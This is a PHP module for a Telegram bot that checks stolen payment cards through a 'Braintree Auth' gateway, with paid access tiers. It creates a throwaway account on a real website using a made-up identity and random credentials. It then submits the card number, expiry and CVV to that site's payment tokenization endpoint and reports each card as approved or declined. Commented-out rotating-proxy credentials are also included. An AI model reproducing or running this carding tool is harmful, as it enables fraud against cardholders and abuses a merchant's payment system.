<?php


$ownerData = file_get_contents('database/owner.txt');
  if (strpos($ownerData, "$userId") !== false) {
      $rank = "OWNER"; 
  } else {
      $paidData = file_get_contents('database/paid.txt');
      $pattern = "/User ID: $userId\nRank: (.+)\n/";
      if (preg_match($pattern, $paidData, $matches)) {
          $rank = $matches[1];
      } else {
          $rank = "FREE";
      }
  }


  if((strpos($text, '/bta') === 0) or (strpos($text, '.bta') === 0) or ((strpos($text, '$bta') === 0) or (strpos($text, '!bta') === 0)) or ((strpos($text, '+bta') === 0) or (strpos($text, '#bta') === 0)) or (strpos($text, '?bta') === 0)) {


  $userData = file_get_contents('database/users.txt');
  if (strpos($userData, $userId) === false) {
  bot('sendMessage', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "<b>
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]ACCESS DENIED! ❌
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]Status: <code>Unregistered User! ⚠️</code>
  [↯]Message: <code>You have to register first to use me</code>
  You have to use <code>/register</code> to use me 
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
      'reply_to_message_id' => $message_id,
      'parse_mode' => 'html'
  ]);
  return;
  }


  if (strlen($message) <= 4) {
              bot('sendMessage', [
          'chat_id' => $chat_id,
          'message_id' => $message_id,
          'text' => "<b>
  - - - - - - - - - - - - - - - - - - - - - - 
  [WRONG FORMAT] ⚠️
  - - - - - - - - - - - - - - - - - - - - - -
  Ex: <code>/ba cc|mm|yy|cvv</code>     
  Gateway <code>Braintree Auth</code>        
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
          'reply_to_message_id' => $message_id,
          'parse_mode' => 'html'
      ]);
  return;
  }  

  $paid = file_get_contents('database/paid.txt');
  if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
  $paids = $matches[1];
  }

  $owner = file_get_contents('database/owner.txt');
  $owners = explode("\n", $owner);

  $authgrp = file_get_contents('database/authgrp.txt');
  $authgrps = explode("\n", $authgrp);

  if (!preg_match($pattern, $paidData, $matches) && !in_array($chatId, $owners)) {

  if (!in_array($chatId, $authgrps)) {

          bot('sendMessage', [
              'chat_id' => $chat_id,
              'message_id' => $message_id,
              'text' => "<b>
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]ACCESS DENIED! ❌
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]Status: <code>Not Allowed Here!⚠️</code>
  [↯]Message: <code>Contact the Owner to authorize</code>
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
              'reply_to_message_id' => $message_id,
              'parse_mode' => 'html'
          ]);
          return;
      }
  }


  $spamResult = isSpamming($userId);
  if($spamResult !== false) {
  bot('sendMessage', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "<b>
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]ANTISPAM DETECTED! ⚠️
  - - - - - - - - - - - - - - - - - - - - - -
  [↯] Try again after $spamResult seconds !
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
      'reply_to_message_id' => $message_id,
      'parse_mode' => 'html'
  ]);
  return;
  }  
  //=========MAIN CODE===========//
  $start_time = microtime(true);

  $messageidtoedit50 = bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"<b>Started checking...</b>",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id,

        ]);

        $messageidtoba = capture(json_encode($messageidtoedit50), '"message_id":', ',');

  if ($_SERVER['REQUEST_METHOD'] == "POST") {
      extract($_POST);
  } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
      extract($_GET);
  }


  $lista = substr($message, 5);
  $lista = clean($lista);
  $check = strlen($lista);
  $chem = substr($lista, 0,1);
  $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
  $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
  $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
  $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
  $strlenn = strlen($cc);
  $strlen1 = strlen($mes);
  $ano1 = $ano;
  $lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


  $last4 = substr($cc, -4);

  //=========BANNED BIN=============//
  $bin = substr($cc, 0, 6);
  $bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

  if(in_array($bin, $bannedBins)) {
  bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtopfw,
              'text'=>"<b>
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]BIN BANNED! ⚠️
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]CC: <code>$lista</code>
  [↯]Reason: <code>All Prepaid banned!</code>
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
              'parse_mode'=>'html',

          ]);
  return;
  }

    //---------------------//
  bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoba,
                'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Braintree Auth
  Status: <code>■□□□□ 20%[🟥]</code>
  Req: <code>@$username</code>
  </b>",
              'parse_mode'=>'html',

        ]);



  function value($str,$find_start,$find_end)
  {
      $start = @strpos($str,$find_start);
      if ($start === false) 
      {
            return "";
      }
      $length = strlen($find_start);
      $end    = strpos(substr($str,$start +$length),$find_end);
      return trim(substr($str,$start +$length,$end));
    }

  function GetStr($string, $start, $end) {
      $str = explode($start, $string);
      $str = explode($end, $str[1]);  
      return $str[0];
  }
  function inStr($string, $start, $end, $value) {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }

  function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
  }

  #$key = pro();
  $web = pro();  



  function mod($dividendo,$divisor)
  {
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
  }
  //================[Functions and Variables]================//
  //=========================[PROXY]=========================//
  // $Websharegay = rand(0,250);
  // $rp1 = array(
  //       //1 => 'krmcyqke-rotate:9kanicwn8thd',
  //       1 => 'lookdvnz-rotate:mms1x3cqscnm',
  //       2 => 'gpwaqrjb-rotate:tv6dlsbhyywo',
  //       3 => 'vhpfjxsx-rotate:xmzs8124xvqg',
  //       4 => 'zhtwglvf-rotate:8okrq6e9k62o',
  // ); 
  // $rotate = $rp1[array_rand($rp1)];
  // $ch = curl_init('https://api.ipify.org/');
  // curl_setopt_array($ch, [
  // CURLOPT_RETURNTRANSFER => true,
  // CURLOPT_PROXY => 'http://p.webshare.io:80',
  // CURLOPT_PROXYUSERPWD => $rotate,
  // CURLOPT_HTTPGET => true,
  // ]);
  // $ip1 = curl_exec($ch);
  // curl_close($ch);
  // ob_flush();  
  // if (isset($ip1)) { $ip = "Live! ✅"; }
  // if (empty($ip1)) { $ip = "Dead! ❌"; }
  //=========================[Proxy Section-END]=========================//
  #------[Email Generator]------#
  function emailGenerate($length = 10)
  {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
  }
  $email = emailGenerate();
    #------[Username Generator]------#
  function usernameGen($length = 13)
  {
    $characters   = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
      return $randomString;
  }
  $un = usernameGen();
  #------[Password Generator]------#
  function passwordGen($length = 15)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $pass = passwordGen();

  #------[CC Type Randomizer]------#
  $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
    );
  $card_type = $cardNames[substr($cc, 0, 1)];





  //==================[Randomizing Details]======================//
  $ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIE, 1); 
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  $resposta = curl_exec($ch);
  $firstname = value($resposta, '"first":"', '"');
  $lastname = value($resposta, '"last":"', '"');
  $phone = value($resposta, '"phone":"', '"');
  $zip = value($resposta, '"postcode":', ',');
  $postcode = value($resposta, '"postcode":', ',');
  $state = value($resposta, '"state":"', '"');
  $city = value($resposta, '"city":"', '"');
  $street = value($resposta, '"street":"', '"');
  $numero1 = substr($phone, 1,3);
  $numero2 = substr($phone, 6,3);
  $numero3 = substr($phone, 10,4);
  $num = $numero1.''.$numero2.''.$numero3;
  $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
  $serv_rnd = $serve_arr[array_rand($serve_arr)];
  $email= str_replace("example.com", $serv_rnd, $email);
  if($state=="Alabama"){ $state="AL";
  }else if($state=="alaska"){ $state="AK";
  }else if($state=="arizona"){ $state="AR";
  }else if($state=="california"){ $state="CA";
  }else if($state=="olorado"){ $state="CO";
  }else if($state=="connecticut"){ $state="CT";
  }else if($state=="delaware"){ $state="DE";
  }else if($state=="district of columbia"){ $state="DC";
  }else if($state=="florida"){ $state="FL";
  }else if($state=="georgia"){ $state="GA";
  }else if($state=="hawaii"){ $state="HI";
  }else if($state=="idaho"){ $state="ID";
  }else if($state=="illinois"){ $state="IL";
  }else if($state=="indiana"){ $state="IN";
  }else if($state=="iowa"){ $state="IA";
  }else if($state=="kansas"){ $state="KS";
  }else if($state=="kentucky"){ $state="KY";
  }else if($state=="louisiana"){ $state="LA";
  }else if($state=="maine"){ $state="ME";
  }else if($state=="maryland"){ $state="MD";
  }else if($state=="massachusetts"){ $state="MA";
  }else if($state=="michigan"){ $state="MI";
  }else if($state=="minnesota"){ $state="MN";
  }else if($state=="mississippi"){ $state="MS";
  }else if($state=="missouri"){ $state="MO";
  }else if($state=="montana"){ $state="MT";
  }else if($state=="nebraska"){ $state="NE";
  }else if($state=="nevada"){ $state="NV";
  }else if($state=="new hampshire"){ $state="NH";
  }else if($state=="new jersey"){ $state="NJ";
  }else if($state=="new mexico"){ $state="NM";
  }else if($state=="new york"){ $state="LA";
  }else if($state=="north carolina"){ $state="NC";
  }else if($state=="north dakota"){ $state="ND";
  }else if($state=="Ohio"){ $state="OH";
  }else if($state=="oklahoma"){ $state="OK";
  }else if($state=="oregon"){ $state="OR";
  }else if($state=="pennsylvania"){ $state="PA";
  }else if($state=="rhode Island"){ $state="RI";
  }else if($state=="south carolina"){ $state="SC";
  }else if($state=="south dakota"){ $state="SD";
  }else if($state=="tennessee"){ $state="TN";
  }else if($state=="texas"){ $state="TX";
  }else if($state=="utah"){ $state="UT";
  }else if($state=="vermont"){ $state="VT";
  }else if($state=="virginia"){ $state="VA";
  }else if($state=="washington"){ $state="WA";
  }else if($state=="west virginia"){ $state="WV";
  }else if($state=="wisconsin"){ $state="WI";
  }else if($state=="wyoming"){ $state="WY";
  }else{$state="KY";} 

  //==============[Randomizing Details-END]======================//
  bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoba,
              'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Braintree Auth
  Status: <code>□■□□□ 40%[🟦]</code>
  Req: <code>@$username</code>
  </b>",
              'parse_mode'=>'html',

          ]);

  //==================[BIN LOOK-UP]======================//
  $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
  $bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];

        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
  }
  //==================[BIN LOOK-UP-END]======================//
  //===========================[1st REQ]===========================//
  $ch = curl_init();
  // curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
  // curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL,'https://www.webpagetest.org/signup');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPGET, 1);
  $headers = array();
  $headers[] = 'referer: https://www.webpagetest.org/';
  $headers[] = 'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  $result = curl_exec($ch);
  $AT = trim(strip_tags(getStr($result,'name="auth_token" value="','"')));
  //===========================[2 REQ]===========================//
  $ch = curl_init();
  // curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
  // curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL,'https://www.webpagetest.org/signup');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'content-type: application/x-www-form-urlencoded';
  $headers[] = 'origin: https://www.webpagetest.org';
  $headers[] = 'referer: https://www.webpagetest.org/signup';
  $headers[] = 'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrf_token=&auth_token='.$AT.'&step=1&plan=MP5&billing-cycle=monthly');
  $result1 = curl_exec($ch);
  bot('editMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$messageidtoba,
        'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Braintree Auth
  Status: <code>□□■□□ 60%[🟩]</code>
  Req: <code>@$username</code>
  </b>",
        'parse_mode'=>'html',
        'disable_web_page_preview'=>'true'
  ]);
  //===========================[3 REQ]===========================//
  $ch = curl_init();
  // curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
  // curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL,'https://www.webpagetest.org/signup');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'content-type: application/x-www-form-urlencoded';
  $headers[] = 'origin: https://www.webpagetest.org';
  $headers[] = 'referer: https://www.webpagetest.org/signup';
  $headers[] = 'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'first-name=broken&last-name=cc&company-name=broken&email='.$email.'&password='.$pass.'&confirm-password=Joker%402019&street-address=gardenia+drive+6767&city=San+Jose&state=CA&country=US&zipcode=92055&csrf_token=&auth_token='.$at.'&plan=MP5&step=2'
  );
  $result3 = curl_exec($ch);
  bot('editMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$messageidtoba,
        'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Braintree Auth
  Status: <code>□□□■□ 80%[🟦]</code>
  Req: <code>@$username</code>
  </b>",
        'parse_mode'=>'html',
        'disable_web_page_preview'=>'true'
  ]);
  //===========================[4 REQ]===========================//
  $ch = curl_init();
  // curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
  // curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL,'https://catchpoint.chargify.com/js/tokens.json');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'Content-Type: application/json';
  $headers[] = 'Host: catchpoint.chargify.com';
  $headers[] = 'Origin: https://js.chargify.com';
  $headers[] = 'Referer: https://js.chargify.com/';
  $headers[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_POSTFIELDS,
'{"key":"chjs_6nx8y5rbw875f78dn5yx7n9g","revision":"2022-12-05","credit_card":{"first_name":"'.$firstname.'","last_name":"'.$lastname.'","full_number":"'.$cc.'","expiration_month":"'.$mes.'","expiration_year":"'.$ano.'","cvv":"'.$cvv.'","device_data":"","billing_address":"gardenia drive 6767","billing_city":"San Jose","billing_state":"CA","billing_country":"US","billing_zip":"92055"},"origin":"https://www.webpagetest.org"}');
  $result4 = curl_exec($ch);
  echo $result4;
  $msg = trim(strip_tags(getStr($result4,'Processor declined: ','"}')));
  curl_close($ch);
  //===========================[4 REQ-END]===========================//
  //===========================[RESPONSES]===========================//
bot('editMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$messageidtoba,
        'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Braintree Auth
  Status: <code>□□□□□ 100%[🟩]</code>
  Req: <code>@$username</code>
  </b>",
        'parse_mode'=>'html',
        'disable_web_page_preview'=>'true'
    ]);
  if(strpos($result4, 'Approved')) {
    $status = ("Approved ✅");
    $respo = ("1000: Approved");
  }
  elseif(strpos($result4, 'Insufficient')) {
    $status = ("Approved ✅");
    $respo = ("Insufficient Funds");
  }
  elseif(strpos($result4, 'Card Issuer Declined CVV (2010)')) {
    $status = ("Approved CCN ✅");
    $respo = "(Card Issuer Declined CVV (2010))";
  } else {
    $status = ("Declined ❌");
    $respo = ("$msg");
  }
  $end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);
  //===========================[RESPONSES-END]===========================//
  //===========================[CHECKER]===========================//
  bot('editMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$messageidtoba,
  'text'=>"<b>
  Braintree Auth
  - - - - - - - - - - - - - - - - - - - - - - - -
  [↯]Card: <code>$lista</code>
  [↯]Status: $status
  [↯]Result: $respo
  - - - - - - - - - - - - - - - - - - - - - - - -
  [↯]Brand: <code>$brand</code>
  [↯]Type: <code>$type</code>
  [↯]Bank: <code>$bank</code>
  [↯]Country: <code>$country_name [$country_flag]</code>
  - - - - - - - - - - - - - - - - - - - - - - - -
  [↯]T: <code>$time SEC</code> | IP: <code>Live ✅</code>
  - - - - - - - - - - - - - - - - - - - - - - - -
  [↯]Req: <b>@$username</b> [$rank]
  </b>",
      'parse_mode'=>'html',
      'disable_web_page_preview'=>'true'
  ]);
    recordBotResponseTimestamp($userId);
  }
  else {
    bot('editMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$messageidtoba,
      'text'=>"<b>Provide a Valid CC</b>",
      'parse_mode'=>'html',
      'disable_web_page_preview'=>'true'
  ]);
  }
